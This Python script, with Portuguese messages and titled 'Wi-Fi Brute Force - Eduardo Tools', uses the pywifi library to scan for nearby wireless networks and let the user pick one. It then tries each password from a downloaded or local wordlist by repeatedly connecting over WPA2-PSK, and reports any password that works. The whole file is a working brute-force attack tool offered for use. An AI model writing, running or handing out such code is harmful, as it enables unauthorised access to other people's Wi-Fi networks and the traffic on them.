import argparse
import pywifi
from pywifi import const
import time
import urllib.request
import os
import sys

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def argument_parser():
    parser = argparse.ArgumentParser(description="Brute force Wi-Fi password (Windows + pywifi)")
    parser.add_argument("-u", "--url", type=str, help="URL com lista de senhas")
    parser.add_argument("-f", "--file", type=str, help="Arquivo com lista de senhas")
    parser.add_argument("-v", "--verbose", action='store_true', help="Mostrar todas as tentativas")
    parser.add_argument("--quick", action='store_true', help="Pular redes duplicadas e reduzir delays")
    args = parser.parse_args()

    # Se não passou URL nem arquivo, usa URL padrão e verbose True
    if not args.url and not args.file:
        args.url = "https://www.ncsc.gov.uk/static-assets/documents/PwnedPasswordsTop100k.txt"
        args.verbose = True
        print(f"[INFO] Nenhuma wordlist informada. Usando URL padrão: {args.url} com verbose ativado.")
    return args

def get_passwords(args):
    try:
        if args.url:
            print(f"[+] Baixando lista de senhas da URL: {args.url}")
            with urllib.request.urlopen(args.url) as response:
                return [line.decode("utf-8").strip() for line in response if line.strip()]
        elif args.file:
            print(f"[+] Lendo lista de senhas do arquivo: {args.file}")
            with open(args.file, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        else:
            # Nunca deve chegar aqui porque ajustamos no parser
            raise ValueError("Você deve fornecer uma URL ou arquivo com -u ou -f.")
    except Exception as e:
        print(f"Erro ao carregar senhas: {e}")
        sys.exit(1)

def scan_networks(quick=False):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(1 if quick else 3)
    results = iface.scan_results()
    seen = set()
    ssids = []
    for net in results:
        if net.ssid and net.ssid not in seen:
            seen.add(net.ssid)
            ssids.append(net.ssid)
    return ssids

def select_target(ssids):
    print("\nRedes Wi-Fi disponíveis:")
    for i, ssid in enumerate(ssids):
        print(f"{i + 1}. {ssid}")
    while True:
        try:
            choice = int(input("\nEscolha o número da rede: "))
            if 1 <= choice <= len(ssids):
                return ssids[choice - 1]
        except:
            pass
        print("Escolha inválida. Tente novamente.")

def connect(ssid, password, iface):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(2.5)
    return iface.status() == const.IFACE_CONNECTED

def brute_force(ssid, passwords, iface, verbose=False):
    print(f"\n[+] Iniciando brute force na rede: {ssid}")
    for pwd in passwords:
        if len(pwd) < 8:
            if verbose:
                print(f"[SKIP] Senha muito curta: {pwd}")
            continue
        if verbose:
            print(f"[TESTANDO] {pwd}")
        if connect(ssid, pwd, iface):
            print(f"\n[✓] SENHA ENCONTRADA: {pwd}")
            return
    print("\n[×] Nenhuma senha funcionou.")

def main():
    cls()
    print("### Wi-Fi Brute Force (Otimizador) - Eduardo Tools ###\n")
    args = argument_parser()
    passwords = get_passwords(args)

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    ssids = scan_networks(quick=args.quick)
    if not ssids:
        print("Nenhuma rede Wi-Fi encontrada.")
        sys.exit(1)

    target = select_target(ssids)
    brute_force(target, passwords, iface, args.verbose)

if __name__ == "__main__":
    main()